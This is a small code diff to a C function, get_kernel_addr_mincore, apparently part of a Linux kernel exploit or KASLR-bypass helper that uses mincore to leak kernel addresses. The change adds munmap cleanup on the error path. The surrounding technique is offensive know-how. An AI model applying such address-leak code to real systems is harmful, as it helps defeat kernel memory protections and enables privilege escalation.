@@ -109,6 +109,8 @@ static unsigned long get_kernel_addr_mincore(void) {
     /* Touch a mishandle with this type mapping */
     if (mincore((void *)0x86000000, 0x1000000, buf)) {
       perror("[-] mincore");
+      if (munmap((void *)0x66000000, len))
+        perror("[-] munmap");
       free(buf);
       return 0;
     }
